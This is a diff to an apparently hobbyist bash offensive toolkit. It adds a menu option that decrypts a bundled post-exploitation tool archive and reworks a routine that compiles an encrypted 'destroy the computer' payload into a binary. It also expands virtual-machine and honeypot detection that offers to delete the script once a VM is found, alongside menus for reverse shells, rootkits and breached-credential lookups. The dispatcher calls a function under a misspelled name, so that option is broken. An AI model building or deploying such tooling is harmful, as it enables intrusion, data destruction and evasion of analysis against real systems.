@@ -95,6 +95,9 @@ NoTouchScript="$lib/NoTouchScript"
 dtc="$lib/oXytNFO911-X-encoded.enc" # Destroy the computer
 dtco="$lib/destroy_computer-X-encoded"
 DestroyTheComputer="$lib/destroy_computer"
+# cstk deployment kit
+zip2go_enc="$lib/cstk_postxzipkit"
+zip2go="$Malware/cstk_Post_x_Kit.zip"
 # Source the Picture that shows before that program runs
 . "$lib/arguments_frame"
 # Breached data folder and many files
@@ -406,6 +409,7 @@ show_help() {
     echo -e "openssl     	------------ 		---------- 	$c	[ openssl helper for hashing passwords, file encryption, generate keys much more ]$b"
     echo -e "secretnote  	secret-note 		secret_note $c		[ create a gpg key with a encoded secret message of your choice ]$b"
     echo -e "binary      	binary-script 		binary_script $c		[ create a encoded - encrypted executable binary script from a bash script ]$x\n"
+    echo -e "postx2go       post-x-2-go         post_x_2_go   $c        [ a zip archive with the needed tools for post exploitation on a remote host ]$x\n"
     echo -e "$c\nHelp Menu Options:\n "
     echo -e "$r \$0	$g		\$1 $r "
     echo -e "sudo cstk$g	-h|-H|--help 	$c				[ Show General Help Menu ]$r"
@@ -460,7 +464,9 @@ function handle_input() {
 
 		5 -$g pawned email check$p		(check __@domain.com breached email/password combos or a single email) $b
 
-		6 -$g google dorks helper$p		(search for passwords, exploits, vulnabilites with over 7000 different search terms) $r
+		6 -$g google dorks helper$p		(search for passwords, exploits, vulnabilites with over 7000 different search terms) $b
+
+		7 -$g email search tool$p           (search for a email linked to 100+ social media accounts) $r
 
 		X - Back to main menu$x" ;;
         2) logo_payload ; echo -e "$b \n\n Enter Payload Tool Number: $g
@@ -484,7 +490,7 @@ function handle_input() {
 		9 -$p Metasploit (msfvenom)$c               (create a shell script for remote connection using msfvenom and metasploit)$r
 
         	X - Back to main menu $x" ;;
-        3) logo_postexploit ; echo -e "$g \n\n Enter Exploit Tool Number: $p
+        3) logo_postexploit ; echo -e "$r \n\n Enter Exploit Tool Number: $p
 
 		1 -$c Check if on VM $g			(Did i gain a shell on a Virtual Machine) $p
 
@@ -505,7 +511,7 @@ function handle_input() {
 		9 -$c Deploy a Rootkit$g			(Setup and run a Rootkit on the current computer) $r
 
 		X - Back to main menu$x" ;;
-        4) logo_etc ; echo -e "$p \n\n Enter Tool Number: $g
+        4) logo_etc ; echo -e "$c \n\n Enter Tool Number: $g
 
         1 -$p Users and Shell's $b 		(find all users and their default shells local computer) $g
 
@@ -517,7 +523,9 @@ function handle_input() {
 
 	5 -$p Secret Message $b         	(create/decode a gpg key look-a-alike that is actually a secret message) $g
 
-	6 -$p Create Binary $b		(Takes in a bash/sh shell script encodes, encrypts, and creates a executable binary file) $r
+	6 -$p Create Binary $b		(Takes in a bash/sh shell script encodes, encrypts, and creates a executable binary file) $g
+
+	7 -$p Post Ex 2 go $b               (A zip archive with all the needed tools for post exploit work on a remote computer) $r
 
         X - Back to main menu $x" ;;
         *) main_menu ;;
@@ -537,6 +545,7 @@ function execute_tool() {
             4) enum_tool ;;
             5) breach_parse_wrapper ;;
             6) google_dorks ;;
+            7) email_search ;;
             X|x) main_menu ;;
             *) class_menu ;;
         esac ;;
@@ -573,6 +582,7 @@ function execute_tool() {
             4) r_b_g_wrapper ;;
 	        5) gpg_lookalike_wrapper ;;
 	        6) create_exe_binary ;;
+	        7) post_x_2_go ;;
             X|x) main_menu ;;
             *) class_menu ;;
         esac ;;
@@ -598,20 +608,18 @@ getip() {
         declare -a ARRAY
         ARRAY=( "\n" "$X_ip" "\n" "$L_ip" "\n" "Other (Enter manually)" )
         clear
-        echo -e "$c Enter the IP address to use. Options are: \n ${ARRAY[*]} $x"
+        echo -e "$c\nEnter the IP address to use. Options are: \n ${ARRAY[*]} $x"
         read -r -p "${g}==> ${x}" chosen_ip
-
-        # Check if the user chose to enter a custom IP
-        if [[ "$chosen_ip" =~ ^[Oo] ]]; then
-            read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
-        fi
 
         # Verify the chosen IP is either in the list or a valid format
         if [[ "$chosen_ip" != "$X_ip" && "$chosen_ip" != "$L_ip" ]]; then
             if ! [[ "$chosen_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
-                echo -e "$r Invalid IP address format. $x"
-                exit 3
-
+                if [[ "$chosen_ip" =~ ^[Oo] ]]; then   # Check for "Other", "other", "O", "o"
+                    read -r -p "${g}Enter the IP address manually: ${x}" chosen_ip
+                else
+                    echo -e "$r\nInvalid IP address format. $x"
+                    exit 3
+                fi
             fi
         fi
         clear
@@ -623,9 +631,8 @@ getip() {
             read -r -p "Enter your port number choice for reverse connect back (1-65535): " chosen_port
         done
         clear
-        echo -e "$c You have selected IP and PORT: $chosen_ip:$chosen_port $x"
-
-        echo -e "$c Is this Correct? Y/N $x"
+        echo -e "\n$c You have selected IP and PORT: $chosen_ip:$chosen_port $x\n"
+        echo -e "$c Is this Correct? Y/N $x\n"
         read -r -p "${c}==> ${x}" ans
         while ! [[ "$ans" =~ [YyNn] ]]; do
                 echo -e "$r Invalid input. Please enter Y or N. $x"
@@ -655,8 +662,8 @@ find_that_ip() {
     data=$(curl -s "http://ip-api.com/json/$Ip")
     data2=$(curl -s "https://internetdb.shodan.io/$ip")
     status=$(echo "$data" | jq -r '.status')
-    ports=$(echo "$data2" | jq -c | jq -c | awk -F ',' '{print $4}' | awk -F ':\[' '{print $1 $2}' | awk -F ']' '{print $1} {print $2}' | tr '"' ' ' | awk -F ' ' '{print $2}')
-    vuln=$(echo "$data2" | jq -c | jq -c | awk -F ',' '{print $6}' | awk -F ':\[' '{print $1 $2 }' | awk -F ']' '{print $1 } {print $2}' | tr '"' ' '| awk -F ' ' '{print $2}')
+    ports=$(echo "$data2" | jq -r '.ports' | tr -d '[]' | tr -d [:space:])
+    vuln=$(echo "$data2" | jq -r '.vulns' | tr -d '[]' | tr -d [:space:])
     if [[ $status == "success" ]]; then
     	clear
         city=$(echo "$data" | jq -r '.city')
@@ -666,13 +673,7 @@ find_that_ip() {
         lat=$(echo "$data" | jq -r '.lat')
         lon=$(echo "$data" | jq -r '.lon')
         isp=$(echo "$data" | jq -r '.isp')
-        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n---------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp" | tee -a "$Loot/IP-Lookup.txt"
-		if [[ -n $ports ]]; then
-        	echo -e "Open Ports Found:\t\t  $ports" | tee -a "$Loot/IP-Lookup.txt"
-        fi
-        if [[ -n $vuln ]]; then
-        	echo -e "\nFound Possible Vulnabilities:\t  $vuln" | tee -a "$Loot/IP-Lookup.txt"
-        fi
+        echo -e "\n\nDate and Time: \t\t\t  $DATE \nUser Name:\t\t\t  $SUDO_USER \nScript Ran:\t\t\t  IP Search \nSearched IP:\t\t\t  $Ip \n--------------------------------------------------------- \nCity:\t\t\t\t  $city \nState:\t\t\t\t  $regionName \nCountry:\t\t\t  $country \nZip:\t\t\t\t  $zip \nLatitude:\t\t\t  $lat \nLongitude:\t\t\t  $lon \nInternet Service Provider:\t  $isp\nOpen Ports:\t\t\t  $ports\nPossible Vulnabilities:\t\t\t  $vuln" | tee -a "$Loot/IP-Lookup.txt"
     	echo -e "$g\nInformation saved in $Loot/IP-Lookup.txt $x"
     else
         echo -e "$r Failed to retrieve information. $x"
@@ -1132,10 +1133,10 @@ destroy_computer() {
 	else
 		openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$dtc" -out "$dtco" -pass pass:"$pswd"
 		base32hex -d "$dtco" | base64 --wrap 16 -d | base32plain -d > "$DestroyTheComputer"
-		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
-		echo '#!/bin/bash' > destroy.temp2
-		cat destroy.temp >> destroy.temp2
-		shc -r -f destroy.temp2 -o "$Malware/CAUTION_DESTROY_COMPUTER"
+#		bash-obfuscate -c 2 -r "$DestroyTheComputer" -o destroy.temp
+#		echo '#!/bin/bash' > destroy.temp2
+#		cat destroy.temp >> destroy.temp2
+		shc -r -f "$DestroyTheComputer" -o "$Malware/CAUTION_DESTROY_COMPUTER"
 		rm -rf destroy.* *.x.* "$dtco" "$DestroyTheComputer"
 		echo "File name and location:  $Malware/CAUTION_DESTROY_COMPUTER"
 		echo -e "\n Date: $DATE \nUser: $USER \n Program used: destroy computer payloads class \n "$USER" has agreed to not use this script for malicious intent. " >> "$log/destroy_computer"
@@ -1188,16 +1189,49 @@ msf_payloads() {
 check_vm() {
 	clear
 	postx_vm_frame
+    exit_or_stay() {
+        echo "Exit system or stay? Exiting system will auto delete script."
+        echo -e "1) Exit Now\n2) Stay Here"
+        read -r -n 1 -p "==> " goon
+        if [[ "$goon" = 1 ]]; then
+            rm -- $0 && exit
+        elif [[ "$goon" = 2 ]]; then
+            echo "Remember this maybe a honeypot dont run commands you dont want others to see"
+        else
+            echo "Bad Option, try again."
+            exit_or_stay
+        fi
+    }
 
-	# shellcheck disable=SC2010
-	if ls -di --color=never /|grep -vqe "^2.*/$"; then
-		echo "Running in chroot"
-	fi
-	if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
-		echo -e "Host is running on a Virtual Machine"
-	else
-        	echo -e "Host is not a Virtual Machine"
-	fi
+    # Check DMI information for VM-related product names
+    if  grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/product_name 2>/dev/null ||
+        grep -qE "(VMware|VirtualBox|QEMU|KVM|Xen|Parallels|Microsoft)" /sys/class/dmi/id/sys_vendor 2>/dev/null; then
+        echo "VM detected via DMI product name or sys_vendor."
+        exit_or_stay
+    fi
+    # Check CPU flags for hypervisor presence
+    if grep -q "^flags.*hypervisor" /proc/cpuinfo; then
+        echo "VM detected via CPU hypervisor flag."
+        exit_or_stay
+    fi
+    # Check manufacturer name using dmidecode (requires root)
+    if command -v dmidecode &>/dev/null; then
+        if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "(VMware|VirtualBox|QEMU|Xen|Microsoft)"; then
+            echo "VM detected via dmidecode system manufacturer."
+            exit_or_stay
+        fi
+    fi
+    # Check MAC addresses (VMs often use known MAC ranges)
+    if ip link show | grep -qE "00:05:69|00:1C:14|00:0C:29|00:50:56|00:16:3E|08:00:27"; then
+        echo "VM detected via MAC address."
+        exit_or_stay
+    fi
+    # Check for common VM-specific modules
+    if lsmod | grep -qE "(vmw_balloon|vboxguest|xen_blkfront|xen_netfront|kvm)"; then
+        echo "VM detected via loaded kernel modules."
+        exit_or_stay
+    fi
+    echo "If no Warnings where given then No VM detected."
 	wait_and_return
 }
 
@@ -1722,7 +1756,7 @@ gpg_lookalike_wrapper() {
     wait_and_return
 }
 
-# Class: ETC - Tool: Create exe Binary
+# Class: ETC - Tool: Create exe Binary - Option 6
 create_exe_binary() {
 	clear
 	etc_binary_frame
@@ -1770,6 +1804,20 @@ create_exe_binary() {
 	wait_and_return
 }
 
+# Class: ETC - Tool: Post exploit tools to go - Option 7
+past_x_2_go() {
+    echo -e "\nThe targets computer will need zip, base64/32/16, and xxd\nAll these tools should be standard on most linux systems\nContinue? y/n"
+    read -r -n 1 -p "==> " opt
+    if [[ "$opt" =~ [Nn] ]]; then
+        wait_and_return
+    elif [[ "$opt" =~ [Yy] ]]; then 
+        openssl enc -d -aes-256-cbc -salt -pbkdf2 -in "$zip2go_enc" -out "$zip2go" -pass pass:"$pswd"
+        echo "zip file is located in the $Malware folder"
+    else
+        class_menu
+    fi
+    wait_and_return
+}
 ######################## MAIN SCRIPT #######################
 check_root
 if [[ $# -eq 0 ]]; then
@@ -1843,6 +1891,7 @@ case $class in
         	    openssl) r_b_g_wrapper ;;
         	    secret_note|secret-note|secretnote) gpg_lookalike_wrapper ;;
 		    	binary|create-binary|create_binary) create_exe_binary ;;
+		    	postx2go|post-x-2-go|post_x_2_go) post_x_2_go ;;
         	    *) echo -e "Unknown Etc program: $2"; show_help; exit 18 ;;
         	esac
         	;;
